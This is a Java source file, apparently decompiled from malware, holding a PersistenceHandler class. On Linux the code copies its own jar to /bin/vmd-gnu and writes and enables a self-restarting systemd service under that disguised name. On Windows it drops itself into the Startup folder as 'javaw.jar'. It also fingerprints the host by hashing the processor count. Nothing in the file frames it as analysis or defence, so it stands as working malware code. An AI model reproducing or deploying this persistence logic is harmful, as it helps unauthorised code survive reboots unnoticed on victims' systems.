import com.sun.jna.platform.win32.KnownFolders;
import com.sun.jna.platform.win32.Shell32Util;
import java.io.File;
import java.net.URL;
import java.nio.file.CopyOption;
import java.nio.file.Files;
import java.nio.file.OpenOption;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.security.MessageDigest;

public class PersistenceHandler {
    public static String getProcessorCountHash() {
        try {
            MessageDigest messageDigest = MessageDigest.getInstance((String)"SHA-1");
            int n = Runtime.getRuntime().availableProcessors();
            messageDigest.update(new byte[]{(byte)n, (byte)(n >>> 8), (byte)(n >> 16), (byte)(n >> 24)});
            return PersistenceHandler.byteArrayToString(messageDigest.digest());
        }
        catch (Exception exception) {
            return exception.getClass().getSimpleName() + " - " + exception.getMessage();
        }
    }

    public static String byteArrayToString(byte[] byArray) {
        StringBuilder stringBuilder = new StringBuilder(byArray.length * 2);
        for (byte by : byArray) {
            stringBuilder.append(by >>> 4).append(by & 0xF);
        }
        return stringBuilder.toString();
    }

    public static void persist() {
        try {
            if (OperatingSystem.isLinux()) {
                File file = new File("/bin/vmd-gnu");
                File file2 = new File("/etc/systemd/system/vmd-gnu.service");
                if (file.exists() && file2.exists()) {
                    boolean bl;
                    Process process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "systemctl --type=service | grep vmd-gnu.service"});
                    process.waitFor();
                    boolean bl2 = bl = process.getInputStream().available() > 0;
                    if (!bl) {
                        Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "systemctl enable vmd-gnu"}).waitFor();
                        Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "systemctl start vmd-gnu"}).waitFor();
                        System.exit((int)0);
                    }
                    return;
                }
                String string = "[Unit]\nDescription=vmd-gnu local service\nAfter=network.target\nStartLimitIntervalSec=0\n\n[Service]\nType=simple\nRestart=always\nRestartSec=1\nUser=" + System.getProperty((String)"user.name") + "\nExecStart=/bin/sh -c \"java -Dauto=true -jar /bin/vmd-gnu\"\n\n[Install]\nWantedBy=multi-user.target";
                URL uRL = PersistenceHandler.class.getProtectionDomain().getCodeSource().getLocation();
                Files.copy((Path)new File(uRL.getFile()).toPath(), (Path)file.toPath(), (CopyOption[])new CopyOption[]{StandardCopyOption.REPLACE_EXISTING});
                Files.write((Path)file2.toPath(), (byte[])string.getBytes(), (OpenOption[])new OpenOption[0]);
                Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "systemctl enable vmd-gnu"}).waitFor();
                Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "systemctl start vmd-gnu"}).waitFor();
                System.exit((int)0);
            } else {
                File file = new File(Shell32Util.getKnownFolderPath(KnownFolders.FOLDERID_Startup), "javaw.jar");
                Files.copy((Path)Main.persistenceFile.toPath(), (Path)file.toPath(), (CopyOption[])new CopyOption[]{StandardCopyOption.REPLACE_EXISTING});
            }
        }
        catch (Throwable throwable) {
            throwable.printStackTrace();
        }
    }
}